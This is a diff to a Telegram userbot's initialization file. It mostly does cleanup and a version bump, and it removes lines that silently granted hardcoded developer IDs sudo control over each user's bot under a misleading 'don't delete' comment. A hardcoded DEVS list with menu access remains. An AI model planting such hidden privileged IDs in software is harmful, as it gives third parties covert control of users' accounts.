@@ -9,6 +9,7 @@
 #
 """ Userbot initialization. """
 
+
 import os
 import re
 import sys
@@ -87,8 +88,8 @@ if CONFIG_CHECK:
     sys.exit(1)
 
 # KALO NGEFORK ID DEVS SAMA ID BLACKLIST_CHAT NYA GA USAH DI HAPUS YA GOBLOK 😡
-DEVS = 844432220, 1906014306, 1382636419, 1712874582, 1738637033,
-SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
+DEVS = (844432220, 1906014306, 1382636419, 1712874582, 1738637033,)
+SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "").split()}
 
 # For Blacklist Group Support
 BLACKLIST_CHAT = os.environ.get("BLACKLIST_CHAT", None)
@@ -217,7 +218,7 @@ BITLY_TOKEN = os.environ.get("BITLY_TOKEN", None)
 TERM_ALIAS = os.environ.get("TERM_ALIAS", "Man-Userbot")
 
 # Bot version
-BOT_VER = os.environ.get("BOT_VER", "1.6.9")
+BOT_VER = os.environ.get("BOT_VER", "1.7.2")
 
 # Default .alive username
 ALIVE_USERNAME = os.environ.get("ALIVE_USERNAME", None)
@@ -294,9 +295,6 @@ for binary, path in binaries.items():
     os.chmod(path, 0o755)
 
 # Jangan di hapus Nanti ERROR
-SUDO_USERS.add(844432220)
-SUDO_USERS.add(1906014306)
-SUDO_USERS.add(1738637033)
 
 # 'bot' variable
 if STRING_SESSION:
@@ -578,9 +576,9 @@ with bot:
         async def on_plug_in_callback_query_handler(event):
             if event.query.user_id == uid or event.query.user_id in DEVS:
                 openlagi = custom.Button.inline(
-                    f"• Re-Open Menu •", data="reopen")
+                    "• Re-Open Menu •", data="reopen")
                 await event.edit(
-                    f"⚜️ **Help Mode Button Ditutup!** ⚜️", buttons=openlagi
+                    "⚜️ **Help Mode Button Ditutup!** ⚜️", buttons=openlagi
                 )
             else:
                 reply_pop_up_alert = (
